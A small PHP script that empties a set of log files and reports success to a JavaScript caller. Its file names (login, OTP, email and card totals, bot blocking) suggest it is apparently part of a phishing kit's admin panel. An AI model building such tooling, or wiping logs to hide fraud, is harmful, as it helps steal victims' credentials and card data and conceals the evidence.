<?php
// Array of files to clear
$filesToClear = [
    "../logs/human.txt",
    "../logs/activity.txt",
    "../logs/total_login.txt",
    "../logs/total_otp.txt",
    "../logs/total_email.txt",
    "../logs/total_card.txt",
    "../logs/block_bot.txt",
    "../logs/total_bot.txt"
];
// Loop through each file and clear its contents
foreach ($filesToClear as $file) {
    if (file_exists($file)) {
        // Clear the content of the file by writing an empty string to it
        file_put_contents($file, '');
    }
}
// Respond back to the JavaScript that the logs were deleted successfully
echo "Logs deleted successfully.";
?>
